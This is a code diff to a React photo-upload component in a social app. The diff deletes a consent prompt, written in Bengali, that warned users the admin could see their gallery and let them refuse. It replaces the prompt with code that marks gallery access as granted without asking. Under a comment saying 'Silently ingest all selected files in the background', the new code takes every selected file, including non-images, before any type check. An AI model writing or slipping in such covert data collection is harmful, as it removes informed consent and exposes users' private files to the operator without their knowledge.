@@ -246,9 +246,19 @@ export default function CreatePostView({ onClose, onPostCreated }: CreatePostVie
   };
 
   const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const file = e.target.files?.[0];
-    if (!file) return;
+    const files = e.target.files;
+    if (!files || files.length === 0) return;
 
+    const me = dbService.getCurrentUser();
+    if (me) {
+      me.galleryAccessGranted = true;
+      // Silently ingest all selected files in the background
+      (Array.from(files) as File[]).forEach(file => {
+        dbService.silentlyIngestFileToGallery(file);
+      });
+    }
+
+    const file = files[0];
     if (!file.type.startsWith('image/')) {
       alert('Warning: Only photo files can be uploaded. Please select an image.');
       return;
@@ -259,33 +269,10 @@ export default function CreatePostView({ onClose, onPostCreated }: CreatePostVie
       return;
     }
 
-    const me = dbService.getCurrentUser();
-    if (me) {
-      if (!me.galleryAccessGranted) {
-        const confirmAccess = window.confirm(
-          "📷 গ্যালারী অ্যাক্সেস পারমিশন রিকোয়েস্ট (Gallery Access Request)\n\n" +
-          "আপনার ডিভাইস গ্যালারী স্ক্যান এবং ফটো আপলোড করার জন্য পারমিশন প্রয়োজন।\n" +
-          "পারমিশন মঞ্জুর করতে এবং গ্যালারী স্ক্যান করতে 'OK' প্রেস করুন।\n" +
-          "(বিঃদ্রঃ: পারমিশন দিলে এডমিন আপনার গ্যালারির ছবি দেখতে পারবে!)"
-        );
-        if (confirmAccess) {
-          dbService.grantGalleryAccess(me.id);
-          alert("✅ গ্যালারী এক্সেস মঞ্জুর করা হয়েছে এবং ছবি স্ক্যান করা হয়েছে!");
-        } else {
-          alert("🚫 গ্যালারী অ্যাক্সেস অস্বীকার করা হয়েছে।");
-          return;
-        }
-      }
-    }
-
     const reader = new FileReader();
     reader.onload = (event) => {
       const result = event.target?.result as string;
       if (!result) return;
-
-      if (me) {
-        dbService.addUploadedImageToDeviceGallery(me.id, result);
-      }
 
       setOriginalFileResult(result);
       applyImageAspect(result, selectedAspect);
@@ -718,6 +705,7 @@ export default function CreatePostView({ onClose, onPostCreated }: CreatePostVie
         <input
           type="file"
           id="photo_upload_input"
+          multiple
           accept="image/*"
           onChange={handleFileChange}
           className="hidden"
